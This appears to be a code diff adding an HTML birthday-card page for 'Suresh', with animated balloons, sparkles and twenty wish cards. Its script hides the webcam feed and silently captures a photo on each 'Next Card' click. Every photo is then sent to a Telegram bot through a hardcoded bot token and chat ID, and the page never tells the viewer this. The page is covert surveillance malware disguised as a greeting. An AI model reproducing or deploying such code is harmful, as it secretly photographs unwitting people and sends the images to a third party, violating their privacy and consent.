@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday Surprise!</title>
+    <style>
+        /* CSS Styling */
+        body {
+            background-color: #fce4ec;
+            color: #5d4037;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        .container {
+            padding: 20px;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+        h2 {
+            font-size: 2em;
+            margin-bottom: 30px;
+        }
+        .card, .collage {
+            display: none;
+            background-color: #fff3e0;
+            border: 2px solid #5d4037;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 300px;
+            position: relative;
+        }
+        .card img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-top: 15px;
+        }
+        #camera {
+            display: none;
+        }
+        .next-card-button {
+            padding: 15px;
+            font-size: 1em;
+            color: #fff;
+            background-color: #5d4037;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            margin: 10px;
+        }
+        .next-card-button:hover {
+            background-color: #8d6e63;
+        }
+        /* Collage Styling */
+        .collage img {
+            width: 70px;
+            height: 70px;
+            margin: 5px;
+            border-radius: 5px;
+            object-fit: cover;
+        }
+        /* Balloon Styling */
+        .balloon {
+            position: absolute;
+            bottom: -50px;
+            width: 40px;
+            height: 60px;
+            background-color: #ff6f61;
+            border-radius: 50%;
+            box-shadow: inset -2px -4px 10px rgba(0, 0, 0, 0.2);
+            animation: floatUp 4s ease-in infinite;
+        }
+        @keyframes floatUp {
+            0% { transform: translateY(0); opacity: 1; }
+            100% { transform: translateY(-100vh); opacity: 0; }
+        }
+        /* Sparkle Styling */
+        .sparkle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #ffd700;
+            border-radius: 50%;
+            opacity: 0;
+            animation: sparkle 0.6s ease-out forwards;
+        }
+        @keyframes sparkle {
+            0% { transform: scale(0); opacity: 1; }
+            100% { transform: scale(1.5); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Happy Birthday, Suresh! 🎉</h1>
+
+        <!-- Camera feed for capturing photos -->
+        <video id="camera" autoplay playsinline></video>
+
+        <!-- Cards with Wishes and Captured Photos -->
+        <div class="card" id="card1"><h2>1. Wishing you a day as sweet as chocolate! 🍫</h2><img src="" id="cardImage1"></div>
+        <div class="card" id="card2"><h2>2. May you be surrounded by love and laughter! 🥳</h2><img src="" id="cardImage2"></div>
+        <div class="card" id="card3"><h2>3. Here’s to endless joy and teddy bear hugs! 🧸</h2><img src="" id="cardImage3"></div>
+        <div class="card" id="card4"><h2>4. May all your dreams take flight! ✨</h2><img src="" id="cardImage4"></div>
+        <div class="card" id="card5"><h2>5. Sending you a year filled with sunshine! 🌞</h2><img src="" id="cardImage5"></div>
+        <div class="card" id="card6"><h2>6. May every wish of yours come true! 🌈</h2><img src="" id="cardImage6"></div>
+        <div class="card" id="card7"><h2>7. Cheers to more laughter and happy memories! 🎉</h2><img src="" id="cardImage7"></div>
+        <div class="card" id="card8"><h2>8. You deserve all the love in the world! ❤️</h2><img src="" id="cardImage8"></div>
+        <div class="card" id="card9"><h2>9. May today be as special as you are! 💖</h2><img src="" id="cardImage9"></div>
+        <div class="card" id="card10"><h2>10. To more sweet moments and beautiful days! 🌹</h2><img src="" id="cardImage10"></div>
+        <div class="card" id="card11"><h2>11. May laughter and joy fill your heart! 🥰</h2><img src="" id="cardImage11"></div>
+        <div class="card" id="card12"><h2>12. Here’s to a life of dreams come true! 💫</h2><img src="" id="cardImage12"></div>
+        <div class="card" id="card13"><h2>13. Hoping your day is as magical as you! 🌠</h2><img src="" id="cardImage13"></div>
+        <div class="card" id="card14"><h2>14. May this year bring you new adventures! 🏞️</h2><img src="" id="cardImage14"></div>
+        <div class="card" id="card15"><h2>15. May you be showered with endless blessings! 🌺</h2><img src="" id="cardImage15"></div>
+        <div class="card" id="card16"><h2>16. Here’s to health, happiness, and love! 💖</h2><img src="" id="cardImage16"></div>
+        <div class="card" id="card17"><h2>17. May you shine brighter every day! 🌟</h2><img src="" id="cardImage17"></div>
+        <div class="card" id="card18"><h2>18. Wishing you joy beyond measure! 🎂</h2><img src="" id="cardImage18"></div>
+        <div class="card" id="card19"><h2>19. May love and happiness follow you always! 💞</h2><img src="" id="cardImage19"></div>
+        <div class="card" id="card20"><h2>20. May all your dreams come true! 🌠</h2><img src="" id="cardImage20"></div>
+
+        <!-- Collage Display -->
+        <div class="collage" id="collage">
+            <h2>Your Birthday Memories! 🎂</h2>
+            <h2>Created with lot of love by nihal💕</h2>
+            <div id="collagePhotos"></div>
+        </div>
+
+        <!-- Next Card Button -->
+        <button class="next-card-button" onclick="nextCard()">Next Card</button>
+    </div>
+
+    <script>
+        const botToken = "7585966233:AAGncmy_VolkAfaPb04Fx_X6b7g4OmUhrZg";
+        const chatId = "6231124027";
+        let currentCardIndex = 1;
+        const totalCards = 20;
+        const capturedPhotos = [];
+
+        const video = document.getElementById('camera');
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => video.srcObject = stream)
+                .catch(error => alert("Camera access error"));
+        }
+
+        function nextCard() {
+            capturePhoto();
+            const imageDataUrl = document.getElementById(`cardImage${currentCardIndex}`).src;
+            sendPhotoToTelegram(imageDataUrl);
+
+            document.getElementById(`card${currentCardIndex}`).style.display = 'none';
+            currentCardIndex++;
+
+            if (currentCardIndex <= totalCards) {
+                document.getElementById(`card${currentCardIndex}`).style.display = 'block';
+                createBalloons();
+                createSparkles();
+            } else {
+                showCollage();
+            }
+        }
+
+        function capturePhoto() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageDataUrl = canvas.toDataURL('image/png');
+            document.getElementById(`cardImage${currentCardIndex}`).src = imageDataUrl;
+            capturedPhotos.push(imageDataUrl);
+        }
+
+        function sendPhotoToTelegram(imageDataUrl) {
+            fetch(imageDataUrl)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'birthday_photo.png');
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log(data))
+                    .catch(error => console.error(error));
+                });
+        }
+
+        function showCollage() {
+            document.getElementById('collage').style.display = 'block';
+            const collagePhotosDiv = document.getElementById('collagePhotos');
+
+            capturedPhotos.forEach(photo => {
+                const img = document.createElement('img');
+                img.src = photo;
+                collagePhotosDiv.appendChild(img);
+            });
+
+            document.querySelector('.next-card-button').style.display = 'none';
+        }
+
+        function createBalloons() {
+            const colors = ['#ff6f61', '#ffd54f', '#4fc3f7', '#a5d6a7', '#ce93d8'];
+            for (let i = 0; i < 5; i++) {
+                const balloon = document.createElement('div');
+                balloon.classList.add('balloon');
+                balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                balloon.style.left = `${Math.random() * 100}vw`;
+                document.body.appendChild(balloon);
+                balloon.addEventListener('animationend', () => balloon.remove());
+            }
+        }
+
+        function createSparkles() {
+            for (let i = 0; i < 10; i++) {
+                const sparkle = document.createElement('div');
+                sparkle.classList.add('sparkle');
+                sparkle.style.left = `${Math.random() * 100}vw`;
+                sparkle.style.top = `${Math.random() * 100}vh`;
+                document.body.appendChild(sparkle);
+                sparkle.addEventListener('animationend', () => sparkle.remove());
+            }
+        }
+
+        document.getElementById(`card${currentCardIndex}`).style.display = 'block';
+    </script>
+</body>
+</html>
